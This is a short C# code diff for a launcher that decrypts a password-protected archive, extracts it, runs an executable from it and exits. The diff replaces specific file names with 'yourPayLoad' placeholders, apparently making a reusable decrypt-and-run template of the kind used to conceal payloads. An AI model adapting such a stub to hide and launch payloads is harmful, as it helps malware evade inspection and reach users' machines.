@@ -104,16 +104,16 @@ namespace tc32k
             string pa = Directory.GetCurrentDirectory();
             int la = args.Length - 1;
             string pwd = args[la];
-            Df(pa + "\\fs64.enc", pa + "\\fs64.zip", pwd);
+            Df(pa + "\\fs64.enc", pa + "\\yourPayLoad.zip", pwd);
             try
             {    
                 Su(pa);
                 Sed(pa);
             }
             catch (Exception t) { Console.Write(t); }
-            string exv = pa + "\\fs64\\RunOnce.exe";
+            string exv = pa + "\\yourPayLoad\\YourInstaller.exe";
             ProcessStartInfo ps = new ProcessStartInfo();
-            ps.WorkingDirectory = pa + "\\fs64";
+            ps.WorkingDirectory = pa + "\\yourPayLoad";
             ps.FileName = exv;
             Process.Start(ps);
             Environment.Exit(0);
